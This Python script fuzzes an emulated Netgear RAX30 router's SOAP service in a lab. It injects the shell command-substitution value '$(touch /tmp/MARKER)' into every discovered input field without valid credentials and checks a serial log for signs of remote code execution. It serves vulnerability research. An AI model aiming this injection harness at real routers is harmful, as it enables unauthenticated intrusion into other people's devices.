#!/usr/bin/env python3
"""Map and probe every generated RAX30 SOAP action in the isolated lab."""

from __future__ import annotations

import json
import re
import subprocess
import time
from pathlib import Path

from probe_rax30_soap_security import MARKER, URN, baseline, raw_request


ROOT = Path(__file__).resolve().parents[1]
BINARY = Path("/tmp/friday-rax30-full-system-root/bin/soap_serverd")
SERIAL = ROOT / "known_firmware/emulation/RAX30/full-system-lab/serial.log"
OUTPUT = ROOT / "known_firmware/emulation/RAX30/full-system-lab/security-matrix.json"
ACTION_PATTERN = re.compile(r"^([A-Z][A-Za-z0-9]+)_([A-Z][A-Za-z0-9]+)$")


def binary_strings() -> list[str]:
    output = subprocess.run(
        ["strings", "-a", str(BINARY)],
        check=True,
        text=True,
        stdout=subprocess.PIPE,
    ).stdout
    return output.splitlines()


def actions() -> list[tuple[str, str]]:
    found = set()
    for line in binary_strings():
        match = ACTION_PATTERN.fullmatch(line)
        if match:
            found.add((match.group(1), match.group(2)))
    return sorted(found)


def input_fields() -> list[str]:
    return sorted({
        line for line in binary_strings()
        if re.fullmatch(r"New[A-Za-z0-9_]{1,80}", line)
    })


def classify(response: bytes) -> str:
    lower = response.lower()
    if not response:
        return "no_response"
    if b"401" in lower or b"unauthorized" in lower or b"authenticate" in lower:
        return "authentication_gate"
    if b"fault" in lower or b"invalid" in lower or b"error" in lower:
        return "soap_fault"
    return "response"


def main() -> int:
    if not BINARY.is_file():
        raise SystemExit(f"missing staged daemon: {BINARY}")
    if not baseline():
        raise SystemExit("baseline failed before matrix")

    command = f"$(touch /tmp/{MARKER})"
    auth_states = (
        ("no_credentials", ()),
        ("invalid_bearer", ("Authorization: Bearer FRIDAY_INVALID",)),
        ("invalid_cookie", ("Cookie: session=FRIDAY_INVALID; token=FRIDAY_INVALID",)),
    )
    results = []
    field_names = input_fields()
    field_batches = [field_names[index:index + 12] for index in range(0, len(field_names), 12)]
    for index, (service, action) in enumerate(actions(), 1):
        for auth_name, headers in auth_states:
            namespace = f"{URN}:{service}:1"
            for batch_index, batch in enumerate(field_batches):
                fields = "".join(f"<{name}>{command}</{name}>" for name in batch)
                body = f'<m:{action} xmlns:m="{namespace}">{fields}</m:{action}>'
                response = raw_request(f"{namespace}#{action}", body, extra_headers=headers)
                results.append({
                    "service": service,
                    "action": action,
                    "auth_state": auth_name,
                    "field_batch": batch_index,
                    "fields": batch,
                    "classification": classify(response),
                    "response_bytes": len(response),
                })
        alive = baseline()
        print(
            f"[{index:03d}] {service}.{action} batches={len(field_batches)} "
            f"auth_states={len(auth_states)} alive={str(alive).lower()}"
        )
        if not alive:
            break

    serial = SERIAL.read_text(errors="replace") if SERIAL.exists() else ""
    sink_lines = [line for line in serial.splitlines() if "FRIDAY_RAX30_RCE_SINK=" in line]
    document = {
        "actions_discovered": len(actions()),
        "input_fields_discovered": len(input_fields()),
        "field_batches": len(field_batches),
        "auth_states": [item[0] for item in auth_states],
        "requests_tested": len(results),
        "baseline_after": baseline(),
        "sink_hits": sink_lines,
        "results": results,
    }
    OUTPUT.write_text(json.dumps(document, indent=2) + "\n")
    print(f"matrix={OUTPUT}")
    print(f"sink_hits={len(sink_lines)}")
    print(f"baseline_after={str(document['baseline_after']).lower()}")
    return 2 if sink_lines or not document["baseline_after"] else 0


if __name__ == "__main__":
    raise SystemExit(main())
